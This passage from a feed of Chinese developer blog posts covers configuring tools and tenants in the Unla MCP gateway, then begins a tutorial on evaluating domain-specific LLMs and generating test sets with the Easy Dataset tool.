        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>                   <span class="hljs-comment"># toJSON：对非JSON原生支持的类型转为JSON格式</span>
      {
        <span class="hljs-attr">"isPublic":</span> {{<span class="hljs-string">.Args.isPublic</span>}},
        <span class="hljs-attr">"showEmail":</span> {{<span class="hljs-string">.Args.showEmail</span>}},
        <span class="hljs-attr">"theme":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.theme}}</span>"</span>,
        <span class="hljs-attr">"tags":</span> {{<span class="hljs-string">.Args.tags</span>}},
        <span class="hljs-attr">"settings":</span> {{ <span class="hljs-string">toJSON</span> <span class="hljs-string">.Args.settings</span> }},
        <span class="hljs-attr">"notifications":</span> {{ <span class="hljs-string">.Args.notifications</span> }}
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}",
        "preferences": {
          "isPublic": {{.Response.Data.preferences.isPublic}},
          "showEmail": {{.Response.Data.preferences.showEmail}},
          "theme": "{{.Response.Data.preferences.theme}}",
          "tags": {{.Response.Data.preferences.tags}},
          "settings": {{ toJSON .Response.Data.preferences.settings }},
          "notifications": {{ toJSON .Response.Data.preferences.notifications }}
        }
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user avatar using a URL via multipart form"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/avatar"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email of the user"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"url"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"form-data"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"The avatar image URL"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "message": "{{.Response.Data.message}}",
        "avatarUrl": "{{.Response.Data.avatarUrl}}"
      }
</span></code></pre>
<ul>
<li><strong>网关处理逻辑</strong>：
当 AI 客户端请求该工具时，Unla 网关会自动构造 HTTP 请求发往后端，并将结果封装为 MCP 响应返回。</li>
</ul>
<h4 data-id="heading-4">三、 客户端接入</h4>
<p>配置完成后，你需要让你的 AI 客户端（如  Dify, Cursor, Claude Desktop）连接到 Unla 网关。</p>
<ol>
<li><strong>获取接入点 URL</strong>：
在 Unla 控制面板查看生成 SSE 和 HTTP 两种类型的端点地址，通常格式为：<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/sse</code>和<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/mcp</code></li>
<li><strong>在客户端配置</strong>（以 Dify 为例）：
<ul>
<li>工具 -&gt; MCP -&gt; 添加MCP服务。</li>
<li>添加“服务端点，名称，服务器标识符，请求头”等信息</li>
</ul>
</li>
</ol>
<h4 data-id="heading-5">四、租户管理</h4>
<h5 data-id="heading-6">1. 租户的作用</h5>
<p>在 Unla 中，租户（Tenant）是一个逻辑隔离单位。其主要用途包括：</p>
<ul>
<li><strong>资源隔离</strong>：不同项目组或部门可以拥有独立的 MCP Server 集合，互不干扰。</li>
<li><strong>配置复用</strong>：可以在不同租户下配置同名的 Server（如 <code>prod-db</code> 和 <code>dev-db</code>），通过租户 ID 进行区分。</li>
<li><strong>安全合规</strong>：为每个租户分配独立的 <code>API Key</code> 或 <code>JWT Secret</code>，确保 A 租户无法调用 B 租户的工具。</li>
</ul>
<h5 data-id="heading-7">2. 租户在网关前缀（Gateway Prefix）中的匹配逻辑</h5>
<p>Unla 网关通过 URL 路径中的前缀来识别请求所属的租户和服务。</p>
<p>标准的路由匹配格式通常如下：
<code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/sse</code> 或 <code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/mcp</code></p>
<hr/>
<h4 data-id="heading-8">五、操作建议</h4>
<ol>
<li><strong>先创建租户</strong>：在 Web UI 的 <strong>"租户管理"</strong> 模块创建租户，并记录其 <code>ID</code>。</li>
<li><strong>绑定 Server</strong>：在创建网关代理配置时，务必选择所属的 <strong>"租户"</strong>。</li>
<li><strong>路由配置</strong>：路由前缀必须以 <strong>"租户ID"</strong> 开头，否则失败。</li>
<li><strong>正确YAML配置文件格式</strong>：通过YAML模式进行网关配置时，确保正确的缩进，否则会失败。</li>
<li><strong>正确的JSON格式数据</strong>：在配置请求或响应Body时，对非JSON原生支持的数据类型通过<code>toJSON</code>进行转换。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南]]></title>    <link>https://juejin.cn/post/7594791357144383530</link>    <guid>https://juejin.cn/post/7594791357144383530</guid>    <pubDate>2026-01-14T11:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144383530" data-draft-id="7594791357144367146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T11:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:29:48.000Z" title="Wed Jan 14 2026 11:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本期视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CRrVB7Eb4%2F" target="_blank" title="https://www.bilibili.com/video/BV1CRrVB7Eb4/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1CR…</a></p>
<hr/>
<ul>
<li>如何评估模型在垂直领域下的表现？</li>
<li>如何评估模型微调前后的效果？</li>
<li>如何量化 RAG 系统的召回率？</li>
<li>如何从领域知识创建模型评估数据集？</li>
</ul>
<hr/>
<p>大家好，欢迎来到 code秘密花园，我是花园老师（ConardLi）。</p>
<p>现在大家都在搞大模型落地，不管是做 RAG（检索增强生成）还是 SFT（监督微调），最让开发者头秃的其实不是 “怎么训练”，而是 “怎么知道训练得好不好”。</p>
<p>在上一期教程：《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FkQIcb6gggF5wf08qjuJcyQ" target="_blank" title="https://mp.weixin.qq.com/s/kQIcb6gggF5wf08qjuJcyQ" ref="nofollow noopener noreferrer">世界最顶级的大模型，都在 PK 些啥？ （大模型评估完全指南）</a>》 中，我们主要介绍了大模型评估的核心流程和业界主流的一些通用 Benchmark（基准测试）。</p>
<p>这些基准一般都用于通用大模型的能力测试，榜单（像 <code>MMLU、ARC</code> ）分数再高，一旦用到具体的业务场景，比如法律合同审核、医疗报告分析、或者公司内部的维修手册，这些通用分数的参考意义就非常有限了。</p>
<p>今天我们就来聊聊，在垂直领域，我们具体应该怎么评估模型的表现？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f69bc972fa7478ab01abdb07c742366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7M2e%2FogNyaJjTylym0fMHqIg%2FVM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">第一部分：理论篇</h2>
<h3 data-id="heading-1">1. 为什么通用评估不够用？</h3>
<p>通用模型往往在公开互联网语料上表现良好，但对于企业内部文档、未公开的行业规范等“长尾知识”表现不佳，必须进行专项评估。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84026c8ee4e0426ba5e19741619e7124~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=EBPd5Wf%2FHmUhTzEnbY%2BWJYBTWzI%3D" alt="" loading="lazy"/></p>
<p>我们在实际业务中，评估模型通常是为了解决三个很具体的问题：</p>
<ul>
<li>
<p><strong>选型心里没底：</strong>
开源模型那么多（Qwen, DeepSeek, MiniMax...），在没微调之前，谁对我的业务文档理解能力更强？如果不跑一遍自己的数据，盲选很容易踩坑。</p>
</li>
<li>
<p><strong>微调效果验证（SFT）：</strong>
你花钱花时间微调了一个模型，Loss 曲线看着挺好，但模型真的变聪明了吗？还是说它只是记住了训练集？更糟糕的是，它会不会学会了专业知识，却把通用的对话能力搞丢了（灾难性遗忘）？这需要对比测试才知道。</p>
</li>
<li>
<p><strong>RAG 系统的“甩锅”依据：</strong>
在检索增强生成（RAG）架构中，模型是否准确利用了检索到的上下文？是否存在幻觉？这需要针对性的评估指标。</p>
</li>
</ul>
<h3 data-id="heading-2">2. 主流的评估方法</h3>
<p>传统的垂直领域评估通常需要 “懂行的人” 来阅卷。但是，行业专家的工作时间是极其昂贵的，几十条数据还能看，成千上万条数据靠纯人工就不太现实了。</p>
<p>而且人的主观标准变动很大，例如，一个文案是“准确”还是“生动”？这种主观性会导致评估结果波动大，难以作为模型对比的硬指标。</p>
<p>在真实的业务场景中，模型在特定领域表现的评估通常靠以下几类评估方法：</p>
<h4 data-id="heading-3">方案一：确定性评估</h4>
<p>标准答案和模型回答的完全匹配是最直接、成本最低的方式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de01379e7b546968b719cee7290a5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=3QdSqpHJSuGqgYafLeWuGKLy41g%3D" alt="" loading="lazy"/></p>
<p>这类评估只能限制在某些特定的题目类型上，就像我们在考试的时候做的判断题、单选题、多选题。</p>
<p>它们的答案是固定的，非黑即白，是否得分还是很好评估的。</p>
<p>但是，此类数据集的制定还是有一定成本的，通用评估集（如 MMLU）涵盖面广但深度不足。针对特定业务的、包含标准答案的高质量题库非常稀缺，往往需要资深专家手工编写，效率极低。</p>
<h4 data-id="heading-4">方案二：基于统计的文本相似度</h4>
<p>比如我们经常听到的 <code>BLEU</code>、<code>ROUGE</code>、<code>METEOR</code> 这些指标是自然语言处理（NLP）领域最常用的自动文本生成评估指标，核心作用是量化机器生成文本（如翻译、摘要、对话回复）与人工标注的参考文本之间的相似度，判断生成结果的质量。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51db7177823d45b0a02541728013814c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=kC4vu%2BGUp6bYI86CgS9oGbsMtUg%3D" alt="" loading="lazy"/></p>
<p>这类指标计算的本质上都是生成文本与参考文本的词汇重叠度。在 LLM 时代，意思相同但表达方式不同的情况是非常普遍的（标准答案是 “利率上调”，模型回答 “加息”。字面上没重合，得分很低，但意思完全一样。），所以参考价值不大了。</p>
<p>在垂直领域知识评估中，这类指标的权重正在被大幅降低，因为它们很容易误杀好模型。</p>
<h4 data-id="heading-5">方案三：基于模型的语义评估</h4>
<p>也就是我们上期教程中提到的 <code>LLM as a Judge</code>。</p>
<p>这是目前搞开放式问答的最优解。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0321e2150ece4d14adc588feb6a9bf0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=em%2FNcB21L%2FUXEALvFwE9RIp2tu4%3D" alt="" loading="lazy"/></p>
<p>核心逻辑：用一个更强、更聪明的模型（比如 <code>GPT-5</code>）当裁判，去给业务模型（比如 <code>Qwen3-7B</code> 的小模型）打分。</p>
<p>此类评估的关键不在流程，而是评分细则（Prompt），不同类型的数据集通常需要制定特定的评估标准。</p>
<h3 data-id="heading-6">3. 真实工作中面临的痛点</h3>
<p>在真实的评估工作中，我们往往面临着以下痛点：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a07537b47624439a38612a0b6d689d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=GdOHQ1UlNgcM0X8H%2Bl0USGEOA3Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>测试集难构造：和模型微调训练面临的问题一样，企业里有海量的 PDF 手册、Markdown 技术文档，但没有现成的 QA 对（问答对）。要评估模型，首先得把非结构化的文档变成结构化的测试集。</p>
</li>
<li>
<p>定性容易，定量难：大家常说“这个模型感觉比那个好”。但在工程上，“感觉”是不值钱的。我们需要具体的指标 — 是召回率提升了？还是幻觉率下降了？所以我们需要一套可量化的指标，并且可以直观的观测。</p>
</li>
<li>
<p>自动化与人工的割裂：完全靠人工测，测不动；完全靠脚本测，不准（尤其是长文本生成）。如何把 “自动化的规模” 和 “人工的精准” 结合起来，是一个普遍性难题。</p>
</li>
</ul>
<h2 data-id="heading-7">第二部分：实战篇</h2>
<p>在实战章节，我们将使用一款工具（<code>Easy Dataset</code>）解决以上痛点。</p>
<blockquote>
<p>Easy Dataset 是一个专为创建大型语言模型数据集而设计的应用程序。通过 Easy Dataset，你可以将领域知识转化为结构化数据集，兼容所有遵循 OpenAI 格式的 LLM API，使数据集构造过程变得简单高效：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset%2F" target="_blank" title="https://github.com/ConardLi/easy-dataset/" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></p>
</blockquote>
<p>在，<code>Easy Dataset</code> 的 1.7.0 版本，支持了全新的 “评估” 模块，能够做到 <strong>自动化生成测试集</strong> + <strong>低成本的创建评估任务</strong> + <strong>可视化的评估结果</strong>。</p>
<h3 data-id="heading-8">1.评估数据集（测试集）生成</h3>
<blockquote>
<p><strong>评估数据集是什么？</strong></p>
<ul>
<li>评估数据集（测试集）是一组“题目 + 标准答案/参考答案 + 评分规则/选项”的集合。你可以用它来：做不同模型的对比评估，长期追踪效果变化。</li>
</ul>
</blockquote>
<h4 data-id="heading-9">题目类型</h4>
<p>一个好的模型评估数据集（测试集）是衡量模型真实能力的基石。在 <code>Easy Dataset</code> 中，评估集不仅仅是问题的集合，更是包含标准答案、考点标签和业务逻辑的综合知识库。</p>
<p>为了全面考察模型能力，我们设计了五种题型：</p>
<ul>
<li><strong>判断题：</strong>
这是最直接的。考察模型对核心事实是否搞混。比如文档里说“温度不能超过 100 度”，题目问“温度是否可以达到 105 度？”，能有效检测幻觉。</li>
<li><strong>单选题：</strong>
4个选项（A-D），单选答案 | 考察模型在干扰项下的知识提取和辨析能力。</li>
<li><strong>多选题：</strong>
多个选项，答案为字母数组（如 <code>["A", "C"]</code>） | 极具挑战性，漏掉一个信息点就选不对。</li>
<li><strong>简答题（短答案）：</strong>
提供标准短答案（20字以内），可测试模型获取核心知识点并精简表达的能力。如：2025 年美团的营收是多少亿？</li>
<li><strong>开放题（长答案）：</strong>
考察推理和总结能力。比如“根据文档描述，分析一下为什么会出现设备异响？”。这种题没有标准死答案，最考验模型的逻辑。</li>
</ul>
<p>并且，在任务配置中 <strong>支持配置各题目类型生成的比例</strong>（比如：我要 30% 的判断题用于测幻觉，70% 的简答题测理解）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4caf47bc3d2d454c929f79a566ace467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=iY%2Bvke5A8lT%2BeKtDKe8lY8Rp2ms%3D" alt="" loading="lazy"/></p>
<p>在 <code>Easy Dataset</code> 中，你可以通过多种方式生成和配置评估数据集（测试集）：</p>
<ul>
<li>从领域文献中提取测试集</li>
<li>从训练集添加或生成测试集变体</li>
<li>导入自定义/平台内置测试集</li>
</ul>
<h4 data-id="heading-10">从领域文献生成测试集</h4>
<p>不管是 PDF 还是 Docx 格式的领域文献，系统支持直接导入。后台会把这些长文本切分成小块（Chunk），然后通过提示词工程，让大模型基于这些文本块自动生成题目。</p>
<p>我们首先来到【数据源-文献处理】模块，导入一份小米 2025 Q3 季度的财报文档：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90562dd550c84b85a6946ee78125c6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=AHYf6ZDksSDmAsYuMGGsMKcrW7s%3D" alt="" loading="lazy"/></p>
<p>系统解析完成后，会对文档进行自动切块，为了保证后续在文本块上生成的测试集更符合主题，我们批量编辑文本块：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c9e8ffb19348699b70cf9756b0b38c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7ZrydmqV2xzrV1C%2Bz%2Bv9Szjq0qg%3D" alt="" loading="lazy"/></p>
<p>在每个文本块的开头增加全局摘要信息：</p>
<blockquote>
<p>全局摘要：当前文本为 <strong>小米集团</strong> 2025 Q3 季度的财报文档的一部分。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2aec2441f84ee2ab986481394a84bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=zI4XAXtW9Zf3nABmDArQ3kwJ9J0%3D" alt="" loading="lazy"/></p>
<p>然后，我们可以选择基于单个文本块生成测试集，或自动生成测试集（后台自动读取并处理未生成测试集的文本块），系统将根据我们前面在项目设置中设置的几种题目类型的比例自动生成测试题目（默认的题目类型判断题、单选题、多选题、简答题、开放题为 <code>1:1:1:1:1</code>）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfe29455c2f482faf2aa9c72960257e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=38O7Sa%2FwAIk7XMvdO49GQL8cszM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>建议：</p>
<ul>
<li>先用 “单个生成” 跑通流程，确认题型质量与期望一致，在执行自动生成任务。</li>
<li>比例配置先从保守开始：开放题比例不要太高（后续教师模型评估成本更高）</li>
</ul>
</blockquote>
<h4 data-id="heading-11">测试题管理</h4>
<p>点击每个文本块上的 <strong>已生成测试题</strong> 标签，我们将跳转至【评估-评估数据集】模块，在这里你可以看到已经生成的所有数据集，你可以根据题目类型、题目内容和标签进行筛选：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47463c166c3e4f2e98f879ccaa8a9c01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=DGPOrlZm1l27TydSuV5UjqedZOo%3D" alt="" loading="lazy"/></p>
<p>点击单个题目，可以查看题目详情：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54881f7c153e48798b7af126dc9d1a80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cgH9SPYF5gQ3u6lQeZPB8h1EEp8%3D" alt="" loading="lazy"/></p>
<p>问题、选项、答案都可以自由编辑，你也可以对题目进行打标签、备注、删除等等：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/601f7268a08c4162aae0a03954caf8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=Hf9S4DEsIANWf1C0%2BiI0p6OXJYQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">从数据集添加</h4>
<p>在以前的项目中，你可能已经使用  <code>Easy Dataset</code> 生成过数据集（训练集），我们也支持直接从已有数据集上标注和生成测试集。</p>
<p>下面我们来到【数据集-单论问答数据集】模块，可以看到之前生成过的数据集：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab7f5c6b253847b6b2cb2029e73953f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=LJXud%2BgUF6YYSgoBIKx0IUgW8W0%3D" alt="" loading="lazy"/></p>
